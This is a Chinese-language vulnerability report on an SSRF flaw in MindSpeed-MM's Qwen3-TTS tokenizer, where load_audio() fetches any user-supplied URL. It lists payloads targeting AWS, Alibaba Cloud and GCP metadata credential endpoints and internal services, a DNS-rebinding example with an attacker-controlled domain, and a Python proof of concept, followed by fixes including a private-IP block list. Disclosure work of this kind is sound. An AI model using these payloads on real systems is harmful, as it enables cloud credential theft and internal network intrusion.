# SSRF 漏洞利用报告

## 漏洞标识

| 项目 | 内容 |
|------|------|
| 漏洞 ID | VULN-DF-MM-SSRF-04 |
| 漏洞类型 | 服务端请求伪造 (SSRF) |
| CWE 编号 | CWE-918 |
| 严重级别 | High |
| 置信度 | 95% |
| 影响组件 | MindSpeed-MM Qwen3-TTS Tokenizer |

---

## 漏洞概述

### 漏洞位置
```
文件: mindspeed_mm/fsdp/models/qwen3tts/inference/qwen3_tts_tokenizer.py
函数: load_audio()
行号: 140-142
```

### 漏洞代码

```python
# 文件: qwen3_tts_tokenizer.py (第 140-142 行)
def load_audio(self, x: str, target_sr: int) -> np.ndarray:
    ...
    if self._is_url(x):
        with urllib.request.urlopen(x) as resp:  # 漏洞点：直接打开用户提供的 URL
            audio_bytes = resp.read()
    ...

# URL 验证函数 (第 109-114 行)
def _is_url(self, s: str) -> bool:
    try:
        u = urlparse(s)
        return u.scheme in ("http", "https") and bool(u.netloc)  # 仅检查协议和域名
    except Exception:
        return False
```

### 漏洞描述

`Qwen3TTSTokenizer.load_audio()` 方法在处理音频输入时，如果输入字符串被识别为 URL（通过 `_is_url()` 方法仅检查协议是否为 http/https 且存在域名），则直接使用 `urllib.request.urlopen()` 打开该 URL，**没有任何 URL 白名单验证、私有 IP 地址过滤、DNS 重绑定防护或其他安全检查**。

攻击者可以通过构造恶意 URL，诱导服务端发起请求访问内部网络资源、云元数据服务或其他敏感端点。

---

## 攻击链分析

### 数据流追踪

```
用户输入 (JSONL文件/API请求)
    ↓
prepare_data.py: line['audio'] 字段
    ↓
Qwen3TTSTokenizer.encode(batch_audios)
    ↓
_normalize_audio_inputs() [第 160-206 行]
    ↓
load_audio(x, target_sr) [第 122-158 行]
    ↓
_is_url(x) 检查 [第 140 行]
    ↓
urllib.request.urlopen(x) [第 141 行] ← 漏洞触发点
```

### 入口点分析

**入口点 1: 数据预处理脚本 (`examples/qwen3tts/prepare_data.py`)**

```python
# 第 38-50 行
total_lines = open(args.input_jsonl).readlines()
total_lines = [json.loads(line.strip()) for line in total_lines]
...
for line in total_lines:
    batch_audios.append(line['audio'])  # 'audio' 字段可以是恶意 URL
    ...
    enc_res = tokenizer_12hz.encode(batch_audios)  # 触发漏洞
```

攻击者可构造恶意 JSONL 文件：
```json
{"audio": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "text": "test"}
```

**入口点 2: 直接 API 调用**

```python
from mindspeed_mm.fsdp.models.qwen3tts.inference.qwen3_tts_tokenizer import Qwen3TTSTokenizer

tokenizer = Qwen3TTSTokenizer.from_pretrained("Qwen/Qwen3-TTS-Tokenizer-12Hz")
# 直接传入恶意 URL
tokenizer.encode("http://internal-service:8080/admin")  # SSRF 触发
```

---

## 漏洞利用

### 利用场景

#### 场景 1: 云环境元数据泄露

**AWS 元数据服务**:
```json
{"audio": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role", "text": "test"}
```

**阿里云元数据服务**:
```json
{"audio": "http://100.100.100.200/latest/meta-data/ram/security-credentials/", "text": "test"}
```

**GCP 元数据服务**:
```json
{"audio": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "text": "test"}
```

#### 场景 2: 内网端口扫描

```json
{"audio": "http://192.168.1.1:22/", "text": "test"}
{"audio": "http://10.0.0.1:6379/", "text": "test"}
{"audio": "http://internal-service:8080/api/admin", "text": "test"}
```

通过响应时间或错误信息差异判断端口开放状态。

#### 场景 3: 内部 API 访问

```json
{"audio": "http://localhost:8080/admin/delete-user?id=1", "text": "test"}
{"audio": "http://internal-db:5432/", "text": "test"}
```

#### 场景 4: DNS 重绑定攻击

```json
{"audio": "http://attacker-controlled-domain.com/audio.wav", "text": "test"}
```

攻击者控制域名解析，首次解析为公网 IP 绕过检查，后续请求解析为内网 IP。

### PoC 代码

```python
#!/usr/bin/env python3
"""
SSRF PoC for MindSpeed-MM Qwen3TTSTokenizer
"""
from mindspeed_mm.fsdp.models.qwen3tts.inference.qwen3_tts_tokenizer import Qwen3TTSTokenizer

def exploit_ssrf():
    # 初始化 tokenizer
    tokenizer = Qwen3TTSTokenizer.from_pretrained(
        "Qwen/Qwen3-TTS-Tokenizer-12Hz",
        device_map="cpu"
    )
    
    # SSRF payload - 访问云元数据服务
    malicious_urls = [
        # AWS IMDSv1
        "http://169.254.169.254/latest/meta-data/",
        # AWS IMDSv2 (尝试获取 token)
        "http://169.254.169.254/latest/api/token",
        # 内网探测
        "http://192.168.1.1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        # 本地服务
        "http://localhost:6379/",  # Redis
        "http://127.0.0.1:5432/",  # PostgreSQL
    ]
    
    for url in malicious_urls:
        try:
            print(f"[*] 尝试访问: {url}")
            tokenizer.encode(url)
        except Exception as e:
            print(f"[!] 错误响应: {e}")
            # 错误信息可能泄露内网服务状态

if __name__ == "__main__":
    exploit_ssrf()
```

### 利用条件

1. 攻击者能够控制音频输入字段（通过 JSONL 文件或 API 调用）
2. 服务端运行在云环境或有内网服务
3. 服务端出站 HTTP 请求未被严格限制

---

## 影响评估

### 可能的攻击后果

| 攻击类型 | 影响 | 严重程度 |
|----------|------|----------|
| 云凭据泄露 | 获取 IAM 角色临时凭证，接管云资源 | Critical |
| 内网服务探测 | 发现内网服务，扩大攻击面 | High |
| 敏感数据读取 | 访问内部 API 获取敏感数据 | High |
| 服务拒绝攻击 | 请求大文件或慢速响应资源 | Medium |
| 绕过防火墙 | 利用服务端代理访问受保护资源 | High |

### 影响范围

- 所有使用 `Qwen3TTSTokenizer.encode()` 或 `load_audio()` 方法的场景
- 数据预处理脚本 `prepare_data.py`
- 任何接受用户输入音频 URL 的服务

---

## 修复建议

### 方案 1: URL 白名单验证

```python
import ipaddress
from urllib.parse import urlparse

ALLOWED_DOMAINS = ["trusted-domain.com", "cdn.example.com"]

def _is_safe_url(self, url: str) -> bool:
    """验证 URL 是否安全"""
    try:
        parsed = urlparse(url)
        
        # 1. 只允许 http/https
        if parsed.scheme not in ("http", "https"):
            return False
        
        # 2. 域名白名单检查
        hostname = parsed.hostname
        if hostname not in ALLOWED_DOMAINS:
            return False
        
        # 3. 禁止私有 IP 地址
        try:
            ip = ipaddress.ip_address(hostname)
            if ip.is_private or ip.is_loopback or ip.is_link_local:
                return False
        except ValueError:
            pass  # 不是 IP，继续检查域名
        
        return True
    except Exception:
        return False
```

### 方案 2: 禁止私有 IP 和特殊 IP

```python
import ipaddress
import socket
from urllib.parse import urlparse

BLOCKED_IP_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),      # Loopback
    ipaddress.ip_network('10.0.0.0/8'),       # Class A private
    ipaddress.ip_network('172.16.0.0/12'),    # Class B private
    ipaddress.ip_network('192.168.0.0/16'),   # Class C private
    ipaddress.ip_network('169.254.0.0/16'),   # Link-local (云元数据)
    ipaddress.ip_network('0.0.0.0/8'),        # Current network
    ipaddress.ip_network('::1/128'),          # IPv6 loopback
    ipaddress.ip_network('fc00::/7'),          # IPv6 private
]

def _is_safe_url(self, url: str) -> bool:
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"):
            return False
        
        # DNS 解析并检查 IP
        hostname = parsed.hostname
        try:
            ip_str = socket.gethostbyname(hostname)
            ip = ipaddress.ip_address(ip_str)
            
            for blocked_range in BLOCKED_IP_RANGES:
                if ip in blocked_range:
                    return False
        except socket.gaierror:
            return False  # DNS 解析失败
        
        return True
    except Exception:
        return False
```

### 方案 3: 使用专用 HTTP 客户端（推荐）

```python
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# 创建带限制的 session
session = requests.Session()
session.trust_env = False  # 禁用代理
session.mount('http://', HTTPAdapter(max_retries=0))
session.mount('https://', HTTPAdapter(max_retries=0))

def load_audio(self, x: str, target_sr: int) -> np.ndarray:
    if self._is_url(x):
        # 添加超时和大小限制
        resp = session.get(x, timeout=10, stream=True)
        resp.raise_for_status()
        
        # 限制响应大小 (防止内存耗尽)
        MAX_SIZE = 50 * 1024 * 1024  # 50MB
        audio_bytes = b''
        for chunk in resp.iter_content(chunk_size=8192):
            audio_bytes += chunk
            if len(audio_bytes) > MAX_SIZE:
                raise ValueError("Response too large")
        ...
```

### 方案 4: 完全禁用 URL 加载（最安全）

```python
def load_audio(self, x: str, target_sr: int) -> np.ndarray:
    # 移除 URL 支持，只允许本地文件和 base64
    if self._is_probably_base64(x):
        wav_bytes = self._decode_base64_to_wav_bytes(x)
        with io.BytesIO(wav_bytes) as f:
            audio, sr = sf.read(f, dtype="float32", always_2d=False)
    else:
        # 验证本地路径
        if not os.path.exists(x):
            raise FileNotFoundError(f"Audio file not found: {x}")
        audio, sr = librosa.load(x, sr=None, mono=True)
    ...
```

---

## 修复优先级建议

| 优先级 | 方案 | 复杂度 | 安全性 |
|--------|------|--------|--------|
| P0 | 方案 4: 禁用 URL | 低 | 最高 |
| P1 | 方案 2 + 方案 3 | 高 | 高 |
| P2 | 方案 1: 白名单 | 中 | 中 |

---

## 参考链接

- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [AWS IMDSv2 安全指南](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)

---

## 总结

该漏洞是一个典型的 SSRF 漏洞，由于 `urllib.request.urlopen()` 直接使用用户提供的 URL 而无任何验证，攻击者可以利用此漏洞：

1. 访问云环境元数据服务获取敏感凭据
2. 扫描和探测内网服务
3. 绕过网络隔离访问内部 API
4. 发起拒绝服务攻击

**建议立即修复**，采用方案 4（禁用 URL 加载）或方案 2+3 组合（私有 IP 过滤 + 安全 HTTP 客户端）进行防护。
